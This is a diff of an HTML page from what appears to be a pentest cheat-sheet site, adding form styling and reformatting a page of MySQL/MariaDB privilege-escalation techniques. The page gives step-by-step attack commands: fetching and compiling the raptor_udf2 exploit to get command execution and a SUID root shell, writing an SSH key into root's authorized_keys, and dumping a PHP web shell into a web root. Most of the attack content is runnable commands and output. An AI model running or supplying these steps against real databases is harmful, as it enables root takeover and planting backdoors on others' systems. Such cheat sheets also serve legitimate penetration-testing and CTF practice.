@@ -199,57 +199,181 @@
   <li><a href="https://tldrbins.github.io/@pe/">Pe</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="abuse-1-user-defined-function-udf">Abuse #1: User Defined Function (UDF)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get the raptor_udf2.c</span>
-</span></span><span class="line"><span class="cl">wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Compile the source script</span>
-</span></span><span class="line"><span class="cl">gcc -g -c raptor_udf2.c
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy to target folder</span>
-</span></span><span class="line"><span class="cl">cp raptor_udf2.so /dev/shm/raptor_udf2.so
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect to database as root</span>
-</span></span><span class="line"><span class="cl">mysql -u root -p&lt;PASSWORD&gt; mysql
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># UDF</span>
-</span></span><span class="line"><span class="cl">create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;/dev/shm/raptor_udf2.so&#39;</span><span class="o">))</span><span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get plug-in directory</span>
-</span></span><span class="line"><span class="cl">show variables like <span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+-----------------+---------------------------------------------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Variable_name   <span class="p">|</span> Value                                       <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+-----------------+---------------------------------------------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> plugin_dir      <span class="p">|</span> /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> plugin_maturity <span class="p">|</span> gamma                                       <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+-----------------+---------------------------------------------+
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy the plugin_dir value</span>
-</span></span><span class="line"><span class="cl"><span class="k">select</span> * from foo into dumpfile <span class="s1">&#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;</span><span class="p">;</span> 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># RCE</span>
-</span></span><span class="line"><span class="cl"><span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell&#39;</span><span class="o">)</span><span class="p">;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get the raptor_udf2.c
+</span></span><span class="line"><span class="cl"><span class="go">wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Compile the <span class="nb">source</span> script
+</span></span><span class="line"><span class="cl"><span class="go">gcc -g -c raptor_udf2.c
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy to target folder
+</span></span><span class="line"><span class="cl"><span class="go">cp raptor_udf2.so /dev/shm/raptor_udf2.so
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect to database as root
+</span></span><span class="line"><span class="cl"><span class="go">mysql -u root -p&lt;PASSWORD&gt; mysql
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> UDF
+</span></span><span class="line"><span class="cl"><span class="go">create table foo(line blob);
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">insert into foo values(load_file(&#39;/dev/shm/raptor_udf2.so&#39;));
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get plug-in directory
+</span></span><span class="line"><span class="cl"><span class="go">show variables like &#39;%plugin%&#39;;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+-----------------+---------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| Variable_name   | Value                                       |
+</span></span></span><span class="line"><span class="cl"><span class="go">+-----------------+---------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+</span></span></span><span class="line"><span class="cl"><span class="go">| plugin_maturity | gamma                                       |
+</span></span></span><span class="line"><span class="cl"><span class="go">+-----------------+---------------------------------------------+
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy the plugin_dir value
+</span></span><span class="line"><span class="cl"><span class="go">select * from foo into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;; 
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">create function do_system returns integer soname &#39;raptor_udf2.so&#39;;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> RCE
+</span></span><span class="line"><span class="cl"><span class="go">select do_system(&#39;cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell&#39;);
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="abuse-2-add-ssh-public-key-to-root">Abuse #2: Add ssh public key to root</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect to database as root</span>
-</span></span><span class="line"><span class="cl">mysql -u root -p&lt;PASSWORD&gt; mysql
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privilege</span>
-</span></span><span class="line"><span class="cl"><span class="k">select</span> current_user<span class="o">()</span><span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">show grants <span class="k">for</span> root@localhost<span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If mysql file write is not able to append or overwrite authorized_keys</span>
-</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="s2">&#34;ssh-ed25519 AAAAC4NzaC1lZDI1NTE8AAAAINAhYR5O6zwRnV147lX8FuuMLs7o+K5/WfaoYVa8SmbR user@computer&#34;</span> into outfile <span class="s2">&#34;/root/.ssh/authorized_keys2&#34;</span><span class="p">;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect to database as root
+</span></span><span class="line"><span class="cl"><span class="go">mysql -u root -p&#39;&lt;PASSWORD&gt;&#39; mysql
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check privilege
+</span></span><span class="line"><span class="cl"><span class="go">select current_user();
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">show grants for root@localhost;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If mysql file write is not able to append or overwrite authorized_keys
+</span></span><span class="line"><span class="cl"><span class="go">select &#34;BASE64_PUB_KEY&#34; into outfile &#34;/root/.ssh/authorized_keys2&#34;;
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="abuse-3-create-php-file-from-database-to-rce">Abuse #3: Create php File from Database to RCE</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="nf">test</span><span class="p">(</span><span class="n">stuff</span><span class="w"> </span><span class="kt">text</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">insert into <span class="nb">test</span> values<span class="o">(</span><span class="s1">&#39;&lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;</span><span class="o">)</span><span class="p">;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> into dumpfile <span class="s1">&#39;C:\\xampp\\htdocs\\cmd.php&#39;</span><span class="p">;</span>
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">create table test(stuff text);
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">insert into test values(&#39;&lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;);
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">select * from test into dumpfile &#39;C:\\xampp\\htdocs\\cmd.php&#39;;
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
